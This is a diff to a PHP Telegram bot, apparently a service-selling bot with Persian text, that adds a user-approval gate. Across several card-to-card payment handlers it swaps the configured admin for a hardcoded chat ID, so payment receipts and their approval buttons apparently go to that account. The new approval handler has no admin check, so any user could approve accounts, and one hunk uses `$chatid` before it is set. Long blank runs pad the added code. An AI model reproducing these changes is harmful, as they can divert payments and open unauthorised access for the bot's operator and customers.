@@ -114,6 +114,143 @@ if($userInfo['phone'] == null && $from_id != $admin && $userInfo['isAdmin'] != t
 		exit();
     }
 }
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+// تعریف متغیر برای روشن یا خاموش کردن احراز هویت
+$authentication_enabled = true;  // true یعنی فعال، false یعنی غیرفعال
+
+// دریافت شناسه کاربری
+$user_id = $from_id;  // شناسه کاربری از متغیر $from_id که در دسترس است
+
+// بررسی وضعیت دسترسی کاربر از دیتابیس
+$stmt = $connection->prepare("SELECT allowed FROM users WHERE userid = ?");
+$stmt->bind_param("i", $user_id);
+$stmt->execute();
+$result = $stmt->get_result();
+$stmt->close();
+
+// اگر احراز هویت فعال باشد
+if ($authentication_enabled) {
+    // اگر کاربر پیدا شد
+    if ($result->num_rows > 0) {
+        $user = $result->fetch_assoc();
+        // بررسی وضعیت allowed
+        if ($user['allowed'] == 0) {
+            // اگر allowed برابر صفر بود، دسترسی داده نمی‌شود و پیام ارسال می‌شود
+            sendMessage("شما جزو کاربران مجاز استفاده از ربات نیستید!  
+
+شناسه کاربری شما:👇🏻
+
+$user_id  
+    
+درصورتی که تمایل به استفاده از ربات و یا خدمات ما دارید، 
+باید احراز هویت شوید. 
+
+جهت درخواست احراز هویت شناسه کاربری خود را که در همین پیام نوشته شده کپی و برای ادمین بفرستید .👇🏻
+
+@configsupporter
+
+بعد از تایید احراز هویت توسط ادمین، روی این دکمه 
+ 
+👉🏻 /start 👈🏻  
+
+کلیک کنید تا منوی اصلی ربات فعال شود.");
+            exit();
+        }
+    } else {
+        // اگر کاربر در دیتابیس پیدا نشد
+        sendMessage("شما جزو کاربران مجاز استفاده از ربات نیستید!  
+
+شناسه کاربری شما:👇🏻
+
+$user_id  
+    
+درصورتی که تمایل به استفاده از ربات و یا خدمات ما دارید، 
+باید احراز هویت شوید. 
+
+جهت درخواست احراز هویت شناسه کاربری خود را که در همین پیام نوشته شده کپی و برای ادمین بفرستید .👇🏻
+
+@configsupporter
+
+بعد از تایید احراز هویت توسط ادمین، روی این دکمه 
+ 
+👉🏻 /start 👈🏻  
+
+کلیک کنید تا منوی اصلی ربات فعال شود.");
+        exit();
+    }
+} else {
+    // اگر احراز هویت غیرفعال است، به کاربر اجازه ورود داده می‌شود
+    sendMessage("احراز هویت غیرفعال است. شما به راحتی می‌توانید از ربات استفاده کنید.");
+}
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
 if(preg_match('/^\/([Ss]tart)/', $text) or $text == $buttonValues['back_to_main'] or $data == 'mainMenu') {
     setUser();
     setUser("", "temp"); 
@@ -824,7 +961,10 @@ if(preg_match('/increaseWalletWithCartToCart(.*)/',$userInfo['step'], $match) an
                 ]
             ]
         ]);
-        sendPhoto($fileid, $msg,$keyboard, "HTML", $admin);
+		
+		$chatid = 7194395398;
+		
+        sendPhoto($fileid, $msg,$keyboard, "HTML", $chatid);
     }else{
         sendMessage($mainValues['please_send_only_image']);
     }
@@ -3237,7 +3377,10 @@ if(preg_match('/payCustomWithCartToCart(.*)/',$userInfo['step'], $match) and $te
                 ]
             ]
         ]);
-        sendPhoto($fileid, $msg,$keyboard, "HTML", $admin);
+		
+		$chatid = 7194395398;
+		
+        sendPhoto($fileid, $msg,$keyboard, "HTML", $chatid);
     }else{
         sendMessage($mainValues['please_send_only_image']);
     }
@@ -3922,7 +4065,10 @@ if(preg_match('/payWithCartToCart(.*)/',$userInfo['step'], $match) and $text != 
             ]
         ]);
         setUser('', 'temp');
-        $res = sendPhoto($fileid, $msg,$keyboard, "HTML", $admin);
+		
+		$chatid = 7194395398;
+		
+        $res = sendPhoto($fileid, $msg,$keyboard, "HTML", $chatid);
     }else{
         sendMessage($mainValues['please_send_only_image']);
     }
@@ -7825,7 +7971,10 @@ if(preg_match('/payRenewWithCartToCart(.*)/',$userInfo['step'],$match) and $text
             ]
         ]);
     
-        sendPhoto($fileid, $msg,$keyboard, "HTML", $admin);
+	
+	     $chatid = 7194395398;
+	
+        sendPhoto($fileid, $msg,$keyboard, "HTML", $chatid);
         setUser();
     }else{
         sendMessage($mainValues['please_send_only_image']);
@@ -7955,6 +8104,127 @@ if(preg_match('/decRenewAcc(.*)/',$data,$match) && ($from_id == $admin || $userI
     sendMessage("😖|تمدید سرویس $remark لغو شد",null,null,$uid);
     exit;
 }
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+if (isset($data) && $data == "manageAllowedUsers") {
+    // تغییر وضعیت به حالت انتظار برای آیدی عددی
+    setUser("waiting_for_user_id", "step");
+
+    // ارسال پیام به کاربر برای درخواست آیدی
+    sendMessage("لطفاً آیدی عددی کاربر را وارد کنید.");
+    exit();
+}
+
+if ($userInfo['step'] == "waiting_for_user_id" && is_numeric($text)) {
+    $userId = (int)$text; // آیدی کاربر وارد شده
+
+    // جستجو در دیتابیس برای پیدا کردن کاربر
+    $stmt = $connection->prepare("SELECT * FROM `users` WHERE `userid` = ?");
+    $stmt->bind_param("i", $userId);
+    $stmt->execute();
+    $userResult = $stmt->get_result();
+    $stmt->close();
+
+    if ($userResult->num_rows > 0) {
+        // اگر کاربر پیدا شد، مقدار allowed را به 1 تغییر می‌دهیم
+        $stmt = $connection->prepare("UPDATE `users` SET `allowed` = 1 WHERE `userid` = ?");
+        $stmt->bind_param("i", $userId);
+        $stmt->execute();
+        $stmt->close();
+
+        // ارسال پیام به کاربر مبنی بر اینکه کاربر مجاز شد
+        $texts = "شما مجاز به استفاده از ربات شدید.
+
+برای فعال شدن منو اصلی ربات روی دکمه استارت زیر کلیک کنید 
+
+👉🏻 /start 👈🏻";
+
+        sendMessage($texts, null, "HTML", $userId);
+
+        // ارسال پیام تایید به خود مدیر
+        sendMessage("شما کاربر با آیدی $userId را مجاز به استفاده از ربات کردید.");
+    } else {
+        // اگر کاربر پیدا نشد، پیامی برای کاربر ارسال می‌کنیم
+        sendMessage("کاربری با این آیدی یافت نشد. لطفا آیدی صحیح را وارد کنید.");
+    }
+    
+	
+	sendMessage($mainValues['start_message'], getMainKeys());
+	
+	
+    // بازگشت به وضعیت عادی
+    setUser("", "step");  // وضعیت به حالت پیش‌فرض باز می‌گردد
+    exit();  // از ادامه پردازش جلوگیری می‌کند
+}
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
 if(preg_match('/payRenewWithWallet(.*)/', $data,$match)){
     $stmt = $connection->prepare("SELECT * FROM `pays` WHERE `hash_id` = ?");
     $stmt->bind_param("s", $match[1]);
@@ -8684,7 +8954,9 @@ if(preg_match('/payIncreaseDayWithCartToCart(.*)/',$userInfo['step'], $match) an
         ]);
 
 
-        sendPhoto($fileid, $msg,$keyboard, "HTML", $admin);
+        sendPhoto($fileid, $msg,$keyboard, "HTML", $chatid);
+		
+		$chatid = 7194395398;
         setUser();
     }else{ 
         sendMessage($mainValues['please_send_only_image']);
@@ -9039,8 +9311,10 @@ if(preg_match('/payIncreaseWithCartToCart(.*)/',$userInfo['step'],$match) and $t
                 ]
             ]
         ]);
-
-        sendPhoto($fileid, $msg,$keyboard, "HTML", $admin);
+        
+		$chatid = 7194395398;
+		
+        sendPhoto($fileid, $msg,$keyboard, "HTML", $chatid);
         setUser();
     }else{
         sendMessage($mainValues['please_send_only_image']);
